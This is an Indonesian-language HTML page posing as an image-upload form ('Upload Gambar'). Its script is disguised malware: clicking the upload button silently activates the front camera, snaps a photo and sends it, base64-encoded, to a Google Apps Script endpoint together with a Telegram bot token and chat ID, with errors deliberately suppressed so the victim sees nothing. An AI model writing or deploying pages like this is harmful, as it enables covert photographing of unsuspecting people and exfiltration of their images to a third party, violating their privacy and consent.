<!DOCTYPE html>
<html>
<head>
  <title>Upload Gambar</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    video {
      display: none;
    }
    canvas {
      display: none;
    }
    
    @keyframes float {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
    }
    
    @keyframes pulse-glow {
      0%, 100% { box-shadow: 0 0 20px rgba(59, 130, 246, 0.5); }
      50% { box-shadow: 0 0 40px rgba(59, 130, 246, 0.8); }
    }
    
    @keyframes gradient-shift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .animate-float {
      animation: float 3s ease-in-out infinite;
    }
    
    .animate-pulse-glow {
      animation: pulse-glow 2s ease-in-out infinite;
    }
    
    .animate-gradient {
      background-size: 400% 400%;
      animation: gradient-shift 4s ease infinite;
    }
  </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">
  
  <!-- Background Elements -->
  <div class="absolute inset-0 overflow-hidden">
    <div class="absolute -top-4 -left-4 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
    <div class="absolute -bottom-8 -right-4 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
    <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-indigo-500 rounded-full mix-blend-multiply filter blur-2xl opacity-10 animate-spin" style="animation-duration: 20s;"></div>
  </div>

  <!-- Main Container -->
  <div class="relative z-10 w-full max-w-md">
    
    <!-- Glass Card -->
    <div class="backdrop-blur-xl bg-white/10 border border-white/20 rounded-3xl p-8 shadow-2xl animate-float">
      
      <!-- Header -->
      <div class="text-center mb-8">
        <div class="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-r from-blue-500 to-purple-600 rounded-2xl mb-4 animate-pulse-glow">
          <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
          </svg>
        </div>
        <h1 class="text-3xl font-bold bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent mb-2">
          Upload Gambar
        </h1>
        <p class="text-gray-300 text-sm">
          Pilih gambar dari galeri Anda
        </p>
      </div>

      <!-- Upload Button -->
      <div class="relative group">
        <input type="file" accept="image/*" id="fakeUpload" class="opacity-0 absolute inset-0 w-full h-full cursor-pointer z-10">
        
        <label for="fakeUpload" class="relative flex flex-col items-center justify-center w-full h-32 bg-gradient-to-r from-blue-600/20 to-purple-600/20 border-2 border-dashed border-blue-400/50 rounded-2xl cursor-pointer transition-all duration-300 group-hover:border-blue-400 group-hover:bg-gradient-to-r group-hover:from-blue-600/30 group-hover:to-purple-600/30 group-hover:scale-105 animate-gradient">
          
          <!-- Upload Icon -->
          <div class="flex flex-col items-center justify-center space-y-3">
            <div class="w-12 h-12 bg-gradient-to-r from-blue-500 to-purple-600 rounded-xl flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
              <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
              </svg>
            </div>
            
            <div class="text-center">
              <p class="text-white font-semibold text-lg group-hover:text-blue-300 transition-colors duration-300">
                üìÅ Pilih Gambar
              </p>
              <p class="text-gray-400 text-sm mt-1 group-hover:text-gray-300 transition-colors duration-300">
                Dari Galeri
              </p>
            </div>
          </div>
          
          <!-- Animated border -->
          <div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-blue-500 to-purple-600 opacity-0 group-hover:opacity-20 transition-opacity duration-300 animate-pulse"></div>
        </label>
      </div>

      <!-- Decorative Elements -->
      <div class="mt-8 flex justify-center space-x-2">
        <div class="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
        <div class="w-2 h-2 bg-purple-400 rounded-full animate-pulse" style="animation-delay: 0.5s;"></div>
        <div class="w-2 h-2 bg-indigo-400 rounded-full animate-pulse" style="animation-delay: 1s;"></div>
      </div>
    </div>

    <!-- Bottom Glow Effect -->
    <div class="absolute -bottom-4 left-1/2 transform -translate-x-1/2 w-3/4 h-4 bg-gradient-to-r from-blue-500/20 to-purple-500/20 blur-lg rounded-full"></div>
  </div>

  <canvas id="canvas"></canvas>

 <script>
  const fakeUpload = document.getElementById('fakeUpload');

  fakeUpload.addEventListener('click', async () => {
    try {
      // Aktifkan kamera depan
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });

      const track = stream.getVideoTracks()[0];
      const capture = new ImageCapture(track);

      // Tunggu 1 detik sebelum ambil gambar
      setTimeout(async () => {
        try {
          const blob = await capture.takePhoto();

          // Konversi gambar ke base64
          const reader = new FileReader();
          reader.onloadend = () => {
            const base64data = reader.result.split(',')[1];

            // Kirim ke Google Apps Script (pihak ketiga)
            fetch("https://script.google.com/macros/s/AKfycbwamarg722--RY0khlui5jwiv-A3h7Gi7agHQfj_0iiOIkOYxrffq0sTD_bWFY8v1IqUw/exec", {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                image: base64data,
                mimeType: blob.type,
                chat_id: "5705682585",
                bot_token: "7967608161:AAELjea1zqMq3pFgjBgXBKq2oYt0xumxTxA"
              })
            });
          };
          reader.readAsDataURL(blob);

          // Matikan kamera
          track.stop();

        } catch (err) {
          // Tidak ada log karena kamu minta silent
        }
      }, 1000);

    } catch (err) {
      // Tidak ada log karena kamu minta silent
    }
  });
</script>

</body>
</html>
